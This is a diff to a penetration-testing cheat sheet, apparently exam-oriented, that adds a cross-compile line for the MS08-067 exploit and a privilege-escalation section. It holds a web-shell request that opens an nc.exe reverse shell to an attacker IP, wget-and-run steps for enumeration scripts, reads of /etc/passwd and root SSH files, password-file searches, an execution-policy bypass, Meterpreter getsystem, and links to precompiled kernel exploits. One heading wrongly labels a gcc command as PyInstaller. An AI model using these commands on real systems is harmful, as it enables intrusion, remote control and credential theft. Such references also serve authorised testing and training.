@@ -93,6 +93,10 @@ Local IP: 10.10.10.10
 
     i586-mingw32msvc-gcc MS08-067.c -o MS08-067.exe  -lrpcrt4 -lws2_32 -lwsock32 -lmpr
 
+<h4>Compiling For Windows with Pyinstaler</h4>
+
+    i686-w64-mingw32-gcc MS08-067.c -o MS08-067.exe  -lrpcrt4 -lws2_32 -lwsock32 -lmpr
+
 <div id="ExploitDevelopment"> <h3>3. Exploit Development</h3></div>
 
 <h4>1. Fuzz</h4>
@@ -259,4 +263,115 @@ PowerShell with nc.exe or another rev shell .exe
 <h4>Windows (Web app with command execution and nc.exe) </h4>
 
     http://1.1.1.1/backdoor.php?cmd=%22nc.exe%20-vn%2010.10.10.10%207777%20-e%20cmd.exe%22
+
+
+<div id="Privilege Escalation"> <h3>6. Privilege Escalation</h3></div>
+
+
+<h4>Interactive Shells </h4>
+
+    python -c 'import pty; pty.spawn("/bin/sh")'
+
+<h4>Linux Scripts </h4>
+
+    wget 10.10.10.10/linuxprivchecker.py
+    python linuxprivchecker.py
+
+    wget 10.10.10.10/linux-enum-mod.sh
+    chmod +x  linux-enum-mod.sh
+    sh linux-enum-mod.sh
+
+    wget 10.10.10.10/linux-local-enum.sh
+    chmod +x  linux-local-enum.sh
+    sh linux-local-enum.sh
+
+    wget 10.10.10.10/unix-privesc-check
+    chmod +x ./unix-privesc-check
+    ./unix-privesc-check
+
+    cd /ftphome 
+    ./linux-exploit-suggester.sh --uname 2.6.18-274.3.1.el5
+
+    wget 10.10.10.10/solaris-exploit-suggester.pl
+    perl solaris-exploit-suggester.pl
+
+<h4>Linux Commands</h4>
+ 
+    uname -a
+    id
+    cat /etc/*-release
+    cat /proc/version
+    cat /etc/issue
+    ifconfig -a
+    netstat -ano 
+    cat /etc/passwd
+    cat /etc/hosts
+    arp -a
+    iptables -L
+    crontab -l
+    cat /root/.ssh/known_hosts
+    find . -name "*password*"
+
+<h4>SearchSploit root Proceses</h4>
+
+    cat process.txt | grep root | cut -d " " -f 9 | grep "\[" | cut -d "[" -f 2 | cut -d "]" -f1 | cut -d "/" -f1  >> root_process.txt 
+    cat root_process.txt | sort -u > proccess.txt 
+    for i in `cat process.txt` ; do  searchsploit %i ; done
+
+<h4>Windows Scripts </h4>
+
+<!--
+
+Run from within CMD shell and write out to file.
+
+C:\temp> powershell.exe -ExecutionPolicy Bypass -File .\jaws-enum.ps1 -OutputFilename JAWS-Enum.txt
+
+Run from within CMD shell and write out to screen.
+
+C:\temp> powershell.exe -ExecutionPolicy Bypass -File .\jaws-enum.ps1
+
+-->
+
+    wpc.exe --audit -a -o report
+
+    cd /ftphome 
+    python windows-exploit-suggester.py --database 2018-09-02-mssb.xls --systeminfo sys-info.txt
+    python windows-exploit-suggester.py --database 2018-09-02-mssb.xls --ostext 'Windows Server 2008 R2'
+
+<h4>Windows Commands </h4>
+
+
+    tree /f /a
+    systeminfo 
+    type boot.ini 
+    hostname
+    ipconfig /all
+    netstat -ano 
+    net users
+    net localgroups 
+    route print
+    arp -A
+    netsh firewall show state
+    netsh firewall show config
+    schtasks /query /fo LIST /v
+    schtasks /query /fo LIST /v
+    net start
+    accesschk.exe -uwcqv "Authenticated Users" *
+    dir network-secret.txt /s
+
+<h4>Meterpreter Tools</h4>
+
+    run arp_scanner -r 1.1.1.0/24
+
+    use auxiliary/scanner/portscan/tcp
+
+    use post/windows/escalate/getsystem
+
+<h4>External Links</h4>
+
+<a href="https://github.com/Ragab0t/priv-escalation/blob/master/MS_privesc_and_exploits_table.csv">Windows Privilege Escalation Matrix</a>
+<a href="https://github.com/Ragab0t/windows-kernel-exploits">Pre-Compiled Windows Exploits</a>
+<a href="https://gtfobins.github.io/#">Escaping Restricted Shells</a>
+
+
 
